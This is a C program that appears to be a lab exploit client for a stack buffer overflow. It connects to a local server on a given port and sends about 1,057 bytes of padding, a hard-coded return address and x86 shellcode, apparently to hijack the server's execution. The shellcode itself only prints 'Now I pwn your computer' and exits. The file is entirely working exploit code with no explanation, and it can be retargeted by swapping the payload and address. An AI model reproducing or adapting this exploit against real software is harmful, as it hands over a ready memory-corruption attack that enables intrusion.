#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
int main(int argc, char *argv[])
{
 int sockfd;
 int len;
 struct sockaddr_in address;
 int result;
 char ch = 'A';
 char sd[32000], rec[1024];


sockfd = socket(AF_INET, SOCK_STREAM, 0);
 address.sin_family = AF_INET;
 address.sin_addr.s_addr = inet_addr("127.0.0.1");
 address.sin_port = htons(atoi(argv[1]));
 len = sizeof(address);
 result = connect(sockfd, (struct sockaddr *)&address, len);

 if (result == -1)
 {
  perror("oops: client1");
 printf("fail");
  exit(1);
 }
int i;
//strcpy(sd, "get /");
strcpy(sd, "aaaaa");
for (i =0; i <= 1050; i++) strcat(sd,"a");
//for (i =0; i <= 20; i++) strcat(sd,"b");
strcat(sd,"\xa8\xcf\xff\xff");
//strcat(sd,"\x90\x90\x90\x90");
strcat(sd,"\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x17\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x4e\x6f\x77\x20\x49\x20\x70\x77\x6e\x20\x79\x6f\x75\x72\x20\x63\x6f\x6d\x70\x75\x74\x65\x72");
strcat(sd,"\r\n\n");
//strcpy(sd,argv[1]);
//strcat(sd," http/1.0\r\n\r\n");
//strcat(sd,"\r\n\r\n");
printf("sending: %s", sd);
send(sockfd,sd,strlen(sd),0);
int b;
b= recv(sockfd, rec, 1024,0);
rec[b]='\0';
printf("\n hello = %s", rec);
 close(sockfd);
 exit(0);
}


